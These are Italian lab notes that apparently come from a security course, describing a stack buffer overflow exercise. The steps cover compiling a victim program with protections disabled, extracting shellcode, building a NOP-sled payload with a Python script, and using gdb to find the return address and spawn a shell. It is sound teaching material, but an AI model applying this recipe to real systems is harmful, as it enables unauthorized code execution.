							*FILE*
vittima.c	è il sorgente del processo da exploitare
vittima		è l'eseguibile da exploitare

shellCode.s 	è il sorgente dello shell code
shellCode	è l'eseguibile dello shellCode
RawCode 	è il disassemblato di shellCode
hack1.py	è lo script python che crea un file composto da:
			una porzione che legge il file RawCode e se lo salva su una variabile
			una porzione che scrive su un file 'payload2':
				* 8 nop (\x90)
				* la variabile
				* 80-8-lun(variabile) nop (\x90)
				* una flag AAAABBBB....FFFF
				* l'indirizzo dove bisogna infilare sullo stack il codice della variabile (lo shellcode)
			scrive ok a schermo se va tutto bene

							*PROCEDURA*
compilare con -fno-stack-protector -z execstack vittima.c 	-->	vittima
compilare con -nostdlib -static shellCode.s 			-->	shellCode

objcopy --dump-section .text=RawCode shellCode			-->	RawCode


python2 hack1.py (indirizzo finale a caso per ora)						-->	payload

gdb vittima
        disass main
        
        b main     |----> metto breakpoint all'inizio e alla fine di main
        b *main+59 |
        
        r < payload2
        c   
        qui sono al secondo breakpoint (la ret di main)
                x/64x $rsp-128 --> mi mostra il contenuto dello stack (un po' sopra e un po' sotto dove dovrò fdare la ret)
                capisco dove andrà il codice maligno osservando dove terminano le \x90 (le prime 8) --> mi segno l'indirizzo

modifico hack1.py con l'indirizzo giusto
python2 hack1.py

gdb vittima
	r < payload2
	se successo dirà che /bin/sh/dash non accetta payload2 come input --> tutto ok, rilancia così
gdb vittima
	set follow-exec-mode new
	r < payload2

	dovrebbe andare
